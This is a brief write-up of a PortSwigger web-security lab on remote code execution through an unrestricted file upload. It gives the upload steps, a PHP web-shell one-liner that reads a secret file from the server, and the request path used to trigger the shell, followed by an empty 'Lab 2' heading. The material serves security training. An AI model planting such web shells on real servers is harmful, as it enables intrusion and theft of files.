# Lab 1: [Remote code execution via web shell upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)
- Login to the given account > Upload an image > Observe the Request & Response in HTTP History > Prepare a web-shell php file script > Upload it > Send the Get Request to Repeater > Change the path to your file.
- php file script `<?php echo file_get_contents('/home/carlos/secret'); ?>`
- Web shell File path: `GET /files/avatars/webshell.php HTTP/1.1`

> Web shell is a `malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests` to the right endpoint.

# Lab 2: 
